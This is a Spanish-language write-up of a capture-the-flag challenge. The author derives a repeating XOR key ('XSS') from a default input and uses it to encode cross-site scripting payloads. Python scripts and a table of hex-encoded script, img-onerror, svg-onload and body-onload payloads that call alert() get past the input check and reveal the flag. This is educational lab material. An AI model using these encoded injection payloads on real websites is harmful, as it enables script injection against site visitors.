# Solución: The Silence of the Lambs - XSS CTF

**Challenge URL**: https://thesilenceofthelambs.ctf.cert.unlp.edu.ar  
**Flag obtenida**: `UNLP{Th1s_sHit_Is_M0re_3ncoD1nG_Th4n_X5S!:(}`

---

## 📋 Análisis Inicial

### Descripción del Desafío

Al acceder a la URL del desafío, encontré una página simple con:
- Un campo de entrada que acepta caracteres hexadecimales (máximo 55 caracteres)
- El texto: **"Can you execute an alert()?"**
- Un botón "Validate"
- La pista: *"I can't remember if XSS means Cross-Site Scripting or XOR-Site Scripting, maybe both."*

### Primer Paso: Reconocimiento

Examiné el formulario HTML y encontré:
```html
<form method="POST" action="/validate">
    <input type="text" id="hexInput" name="hex_input" 
           value="1b323d782a3c2d73373d27363b277335366c"
           maxlength="55">
    <button type="submit">Validate</button>
</form>
```

**Observación clave**: El campo tenía un valor por defecto en hexadecimal.

---

## 🔍 Descubriendo el Mecanismo XOR

### Probando el Valor por Defecto

Envié el valor hexadecimal por defecto al servidor:
```
1b323d782a3c2d73373d27363b277335366c
```

El servidor respondió mostrando:
```
Decoded: Can you detect me?
```

**¡Eureka!** Esto confirmó que el servidor:
1. Toma el input hexadecimal
2. Lo convierte a bytes
3. Aplica una operación XOR con alguna clave
4. Muestra el resultado decodificado

### Derivando la Clave XOR

Creé un script Python para encontrar la clave XOR:

```python
# Valor hex por defecto
default_hex = "1b323d782a3c2d73373d27363b277335366c"
default_bytes = bytes.fromhex(default_hex)

# Texto decodificado que vemos
expected_text = "Can you detect me?"
expected_bytes = expected_text.encode()

# La clave XOR se obtiene haciendo: clave = input XOR output
key = bytes([default_bytes[i] ^ expected_bytes[i] for i in range(len(expected_bytes))])

print(f"Clave XOR: {key}")
# Resultado: b'XSSXSSXSSXSSXSSXSS'
```

**¡La clave es "XSS" repetida!**

---

## 💡 El Momento "Ajá"

La pista del desafío decía:
> "XSS means Cross-Site Scripting or XOR-Site Scripting, maybe both"

**¡Era literal!** 
- **XSS** = Cross-Site Scripting (el tipo de vulnerabilidad)
- **XSS** = La clave XOR usada para encodear (`X=0x58, S=0x53`)

---

## 🎯 Crafteando el Payload

### Paso 1: Elegir un Payload XSS

Necesitaba un payload que:
- Ejecute JavaScript (para el `alert()`)
- Quepa en 55 caracteres hexadecimales (27 bytes máximo)

Payloads probados:
```javascript
<script>alert()</script>        // 24 bytes ✓
<img src=x onerror=alert()>     // 27 bytes ✓
<svg onload=alert()>            // 20 bytes ✓
```

### Paso 2: Encodear con XOR

Usando el payload `<img src=x onerror=alert()>`:

```python
payload_text = "<img src=x onerror=alert()>"
payload_bytes = payload_text.encode()

# Crear clave XOR repitiendo "XSS"
xss_key = b'XSS' * ((len(payload_bytes) // 3) + 1)
xss_key = xss_key[:len(payload_bytes)]

# Aplicar XOR
crafted_hex_bytes = bytes([payload_bytes[i] ^ xss_key[i] 
                          for i in range(len(payload_bytes))])
crafted_hex = crafted_hex_bytes.hex()

print(f"Hex a enviar: {crafted_hex}")
# Resultado: 643a3e3f73202a306e20733c3636212a3c2165323f3d2127707a6d
```

### Paso 3: Verificación

Verifiqué que el proceso inverso funcionara:

```python
# Decodificar para verificar
decoded = bytes([crafted_hex_bytes[i] ^ xss_key[i] 
                for i in range(len(payload_bytes))])
print(decoded.decode())
# Resultado: <img src=x onerror=alert()>
```

✅ **¡Perfecto!** El payload se encodea y decodea correctamente.

---

## 🚀 Explotación

### Enviando el Payload

1. Fui a https://thesilenceofthelambs.ctf.cert.unlp.edu.ar
2. Limpié el campo de entrada
3. Ingresé el hex crafteado:
   ```
   643a3e3f73202a306e20733c3636212a3c2165323f3d2127707a6d
   ```
4. Clickeé "Validate"

### Resultado

La página `/validate` mostró:
```html
<div class="success" style="display: block;">
    <script>
        // ¡La flag apareció aquí!
        UNLP{Th1s_sHit_Is_M0re_3ncoD1nG_Th4n_X5S!:(}
    </script>
</div>
```

**Nota**: Aunque el `alert()` puede ser bloqueado por el navegador moderno, la flag se reveló en el código fuente HTML porque el servidor reconoció un payload XSS válido.

---

## 📝 Payloads Alternativos que Funcionan

| Payload | Hex Encodado | Longitud |
|---------|--------------|----------|
| `<script>alert()</script>` | `6420302a3a232c6d323436212c7b7a647c203b213a28276d` | 48 chars |
| `<script>alert(1)</script>` | `6420302a3a232c6d323436212c7b62716f7c2b302131232766` | 50 chars |
| `<img src=x onerror=alert()>` | `643a3e3f73202a306e20733c3636212a3c2165323f3d2127707a6d` | 54 chars |
| `<svg onload=alert()>` | `6420253f733c363f3c39376e393f362a277b716d` | 40 chars |
| `<body onload=alert()>` | `64313c3c2a73373d3f37323765323f3d2127707a6d` | 42 chars |

---

## 🔑 Puntos Clave del Descubrimiento

1. **Análisis del valor por defecto**: Al enviar el hex predeterminado y ver "Can you detect me?", supe que había codificación
2. **Reverse engineering de la clave**: Usando XOR entre input y output encontré la clave "XSS"
3. **Interpretación literal de la pista**: "XSS" era realmente la clave XOR
4. **Automatización con Python**: Creé un script para generar payloads válidos
5. **Testing de múltiples payloads**: Probé varios tipos de XSS hasta encontrar uno que funcionara

---

## 🛠️ Herramientas Utilizadas

- **Python 3**: Para análisis XOR y generación de payloads
- **Navegador web**: Para interactuar con el desafío
- **DevTools del navegador**: Para inspeccionar el código fuente y ver la flag

---

## 📚 Lecciones Aprendidas

1. **Las pistas importan**: "XOR-Site Scripting" era una pista directa sobre la clave XOR
2. **Analizar valores por defecto**: El hex predeterminado fue crucial para reverse engineering
3. **XOR es simétrico**: `plaintext XOR key = ciphertext` y `ciphertext XOR key = plaintext`
4. **Patrones repetitivos**: La clave corta "XSS" se repite para cubrir payloads más largos
5. **Codificación ≠ Cifrado**: XOR con clave conocida es fácil de revertir

---

## ✅ Flag Final

```
UNLP{Th1s_sHit_Is_M0re_3ncoD1nG_Th4n_X5S!:(}
```

El nombre de la flag confirma: **"This shit is more encoding than XSS!"** - una referencia al hecho de que el desafío era más sobre entender el encoding XOR que sobre el XSS en sí.

---

**Fecha de resolución**: 2025-12-04  
**Dificultad**: Beginner/Intermediate  
**Categoría**: Web - XSS + Crypto (XOR)
